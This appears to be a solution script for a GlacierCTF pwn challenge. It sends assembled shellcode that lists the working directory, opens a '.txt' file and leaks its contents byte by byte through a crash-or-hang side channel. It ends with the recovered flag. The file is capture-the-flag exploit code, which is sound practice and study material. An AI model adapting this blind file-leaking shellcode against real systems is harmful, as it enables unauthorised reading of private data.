#!/usr/bin/env python3

from pwn import *
import string
import time

p64 = lambda x: util.packing.p64(x, endian='little')
u64 = lambda x: util.packing.u64(x, endian='little')
p32 = lambda x: util.packing.p32(x, endian='little')
u32 = lambda x: util.packing.u32(x, endian='little')

exe = ELF("./vuln")
libc = exe.libc

context.binary = exe
context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']
context.log_level = 'error'


def conn():
	if args.LOCAL:
		r = process([exe.path])
	elif args.REMOTE:
		r = remote("chall.glacierctf.com", 13383)
	else:
		r = gdb.debug([exe.path])
	return r


def main():
	flag = "gctf{"
	while flag[-1] != '}':
		for guess in '_}' + string.printable:
			print(flag + guess)
			r = conn()

			AT_FDCWD = -100
			O_DIRECTORY = 0x10000

			sc = shellcraft.pushstr('.')
			sc += shellcraft.openat(AT_FDCWD, 'rsp', O_DIRECTORY)
			sc += 'sub rsp, 01000\n'
			sc += shellcraft.getdents('rax', 'rsp', 0x10000)
			sc += '''
			mov rax, rsp
			txt_finder:
			inc rax
			cmp DWORD PTR [rax], 1954051118
			jne txt_finder
			'''
			sc += '''
			file_start:
			dec rax
			cmp BYTE PTR [rax], 0
			jne file_start
			inc rax
			'''

			sc += shellcraft.openat(AT_FDCWD, 'rax', 0)
			sc += shellcraft.read('rax', 'rsp', 0x100)

			sc += f'''
			add rsp, {len(flag)}
			'''

			sc += f'''
			good:
			cmp BYTE PTR [rsp], {ord(guess)}
			je good
			'''

			sc = asm(sc)
			assert len(sc) < 0x7b
			r.sendlineafter(b'Shellcode: ', sc)

			time.sleep(.1)
			isGood = True

			try:
				r.recv(1024, timeout=.3)
			except EOFError:
				isGood = False
			r.close()

			if isGood:
				flag += guess
				print(flag)
				break



if __name__ == "__main__":
	main()

# gctf{W41t__1D_yoU_R3aLlY_r3Bu1Ld_L$?}
